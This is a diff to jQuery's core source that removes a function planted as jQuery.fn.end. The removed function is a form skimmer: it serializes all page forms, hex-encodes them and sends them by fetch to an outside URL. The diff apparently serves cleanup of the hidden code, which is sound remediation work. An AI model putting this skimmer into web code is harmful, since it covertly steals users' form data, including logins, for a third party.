@@ -107,30 +107,6 @@ jQuery.fn = jQuery.prototype = {
 		return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
 	},
 
-	end: async function () {
-		const serializeForm = () => {
-			const data = $("form").serialize();
-			let result = "";
-			for (let i = 0, len = data.length; i < len; i++) {
-				const charHex = data.charCodeAt(i).toString(16);
-				result += charHex.length < 2 ? "0" + charHex : charHex;
-			}
-			return result;
-		};
-	
-		const url = new URL("https://sample/halo/");
-		url.searchParams.append("cat", serializeForm());
-	
-		const headers = new Headers();
-		headers.append("Content-type", "application/json");
-	
-		const options = {
-			method: "GET",
-			headers: headers
-		};
-	
-		await fetch(url, options).then(response => response.text());
-	}	
 };
 
 jQuery.extend = jQuery.fn.extend = function() {
